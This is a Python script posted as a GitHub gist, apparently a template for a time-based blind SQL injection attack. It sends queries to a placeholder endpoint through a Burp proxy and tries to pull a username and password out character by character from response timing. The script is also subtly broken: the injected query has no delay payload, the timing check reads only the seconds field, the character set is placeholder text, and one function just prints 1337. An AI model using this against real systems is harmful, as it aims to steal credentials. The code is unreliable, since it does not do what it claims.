#date: 2022-05-18T17:11:03Z
#url: https://api.github.com/gists/a7ad4aaa7ca60aacba25b54b74aba2f3
#owner: https://api.github.com/users/richardcurteis

#!/usr/bin/python3

import datetime
from requests import Session
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

URL = "https://some_host"
ENDPOINT = "/SOMEPATH"
PROXIES = { "http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080" } # Running with this set in send_post(0 will let you debug script with Burp
DELAY = 10


def set_headers():
    return {
        "Cookie": "1234"
        # Set any other headers that are needed here
    }


def enum_target_length():
    print(1337)
    # Should be able to figure this from what's below


def enum_user_pass(target):
    # You will probably need to enumerate the length of the object being enumerated 
    return_value = ""
    chars = "insert all chars a-zA-Z0-9"
    for char in chars:
        query = f"SELECT {target} FROM {char} "
        start = current_time()
        res = send_post(query)
        if res.status_code == 200 and (current_time() - start >= DELAY ):
            return_value = return_value + char
    
    # Once you have hit your success condition. This could be the length of the target string or maybe no match from a-zA-Z0-9
    return return_value


def current_time():
    return datetime.datetime.now().second


def send_post(query):
    try:
        session = Session()
        return session.post(URL + ENDPOINT, data=query, proxies=PROXIES, verify=False)
    except Exception as e:
        print("[!] Exception: " + str(e.message))



if __name__ == "__main__":
    username = enum_user_pass("username")
    print(username)
    password = enum_user_pass("password")
    print(password)
